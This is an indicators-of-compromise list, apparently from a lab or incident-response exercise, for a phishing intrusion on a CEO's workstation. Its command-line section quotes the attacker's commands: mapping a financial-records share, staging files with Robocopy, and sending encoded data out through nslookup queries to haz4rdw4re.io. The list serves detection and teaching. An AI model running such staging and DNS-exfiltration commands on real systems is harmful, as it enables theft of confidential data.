# Indicators of Compromise (IOCs)

## File-Based Indicators

* ImportantInvoice-Febrary.zip
* Malicious .lnk file disguised as PDF
* PowerShell script (.ps1)
* Downloads\exfiltration directory

## Process Indicators

* powershell.exe execution from Temp/Downloads
* powershell.exe spawning:

  * net.exe
  * Robocopy.exe
  * nslookup.exe

## Command-Line Indicators

* net use Z: \FILESRV-01\SSF-FinancialRecords
* net use Z: /delete
* Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E
* nslookup.exe <encoded_data>.haz4rdw4re.io

## Network Indicators

* Domain: haz4rdw4re.io
* Suspicious DNS queries with encoded subdomains

## Behavioral Indicators

* Execution from user Downloads directory
* Creation of staging folder "exfiltration"
* Use of legitimate tools for malicious purposes (LOLBins)
* DNS-based data exfiltration

## Host Information

* Host: win-3450
* User: michael.ascot
* Role: CEO

## Attack Techniques

* Phishing (Initial Access)
* Execution via .lnk file
* PowerShell exploitation
* Lateral movement via network share
* Data staging
* Defense evasion (cleanup)
* DNS exfiltration
